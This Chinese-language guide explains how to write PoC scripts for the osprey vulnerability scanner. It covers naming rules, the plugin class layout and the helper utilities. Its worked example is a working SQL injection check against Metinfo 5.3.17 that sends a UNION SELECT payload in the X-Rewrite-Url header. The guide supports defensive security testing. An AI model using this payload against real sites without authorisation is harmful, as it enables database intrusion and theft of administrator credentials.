# osprey PoC编写规范和要求说明

基于osprey编写PoC，需要遵循框架格式的约定。

使用者可以编写更多的PoC来扩充osprey的安全能力，同时，漏洞盒子提供PoC接收平台，面向公众群体（白帽子/开发人员/安全研究人员/安全技术爱好者等）有偿接收PoC，欢迎前往 [```漏洞盒子PoC接收平台```](https://www.vulbox.com/poc/submit) 提交。

### 从一个示例中学习编写osprey PoC

osprey使用Python3开发，PoC脚本也应使用py3.

- PoC脚本命名规范

文件名称由VID和英文描述两部分组成，VID号以“vb_year_xxxx”为格式，英文描述需遵循驼峰命名法，使用“_”连接，尽量体现存在漏洞的组建、版本、路径、漏洞类型等信息。

由于osprey调用PoC脚本时是通过–v参数指定选用某个PoC的，因此文件名格式必须正确包含VID号且唯一。

命名示例：vb\_2017\_0060\_Metinfo\_5\_3\_17\_X\_Rewrite\_url\_Sql_Injection.py

- PoC编写

```python
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin          # 导入其他的脚本需要用到的模块


POC_NAME = "MetinfoXRewriteurlSQLInjection"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class MetinfoXRewriteurlSQLInjection(BasePoc):

    # PoC实现类，需继承BasePoc
    # 为PoC填充poc_info、scan_info、test_case三个字典中的基本信息

    poc_info = {
        'poc': {
            'Id': 'vb_2017_0060',    # PoC的VID编号
            'vbid': '',
            'Name': 'Metinfo 5.3.17 X-Rewrite-url SQL Injection',    # PoC名称
            'Author': 'ice.liao',    # PoC作者
            'Create_date': '2017-08-15',    # PoC创建时间
            },

        'vul': {
            'Product': 'Metinfo',    # 漏洞所在产品名称
            'Version': '5.3.17',    # 产品的版本号
            'Type': 'SQL Injection',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                MetInfo是中国长沙米拓信息技术有限公司的一套使用PHP和Mysql开发的内容管理系统（CMS）
                危害: 网站数据库信息可造成泄漏，管理员密码可被远程攻击者获得
                修复建议： 前往http://www.metinfo.cn/download/下载最新版本
            ''',    # 漏洞简要描述
            'DisclosureDate': '2017-08-11',    # PoC公布时间
        }
    }

    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # 以下是PoC的检测逻辑
        url = urljoin(target,'index.php?lang=Cn&index=1')
        payload = "1/2/zxxza' union select 1,2,3,md5(0x11),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#/index.php"
        headers = {
            "X-Rewrite-Url": payload
        }

        location = ""
        # 使用req做HTTP请求的发送和响应的处理，req是TCC框架将requests的HTTP请求方法封装成统一的req函数，使用req(url, method, **kwargs)，参数传递同requests
        resp = req(url, 'get', headers=headers, allow_redirects=False)
        if resp is not None:
            location = resp.headers.get("Location", "")

        if "47ed733b8d10be225eceba344d533586" in location:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = "X-Rewrite-Url:" + payload
            if verbose:
                highlight('[*] Metinfo 5.3.17 X-Rewrite-url SQL Injection found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息


    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)
```


### osprey框架可用工具介绍

在编写PoC脚本的过程中，可以使用其他的第三方模块，除了使用其他第三方模块和自己编写函数实现，osprey还提供了utils.py作为常用函数封装库，免去自己定义实现一些通用功能的，直接导入便可使用。

```python
from utils import *

tree()    # 生成树，使用方法：
test = tree()
test["A"]["B"] = "1"
test["A"]    # {'B': '1'}
test["A"]["B"]    # '1'


now()    # 返回当前时间，格式为：“YYYY-MM-DD HH:MM:SS,MS”，逗号后为毫秒

is_same_domain(url1, url2)    # 判断2个URL是否为同域，此处并非严格的同源。端口不同或协议不同均判断为同域

get_absolute_url(base, url)    # 获取URL的绝对路径

retrieve_url_from_page(p_url, keyword, depth)    # 从p_url页面中查找获取含指定关键字的URL链接

retrieve_url_from_spider(spider)   # 从爬虫URL文件中获取URL链接

normalize_url(url)    # 格式化不规范的URL为http://xxx/

valid_status_code(status_code)    # 判断HTTP请求的返回状态码，当状态码为4XX-5XX时返回False

target_handler(target, port, payload)    # 对url进行port和payload的拼接,返回一个列表

get_scan_info(scan_info)    # 返回scan_info中的Target和Verbose数据

isIP(target)    # 判断输入数据是否是IP

req(url, method, **kwargs)    # 封装了requests模块的各种HTTP请求方法，参数传递同requests的使用一致

get_html(url, **kwargs)    # 发起GET请求取回Response body，注意返回的数据格式为bytes类型

get_blind_inject_url(task_id, param)    # 获取唯一标识检测目标的DNS域名

get_blind_inject_result(inject_url)    # 获取盲注检测结果

url_join(base, url)    # 对两个路径进行拼接

info(message)    # 打印info日志

warn(message)    # 打印warn日志

error(message)    # 打印error日志

highlight(message)    # 打印highlight日志
```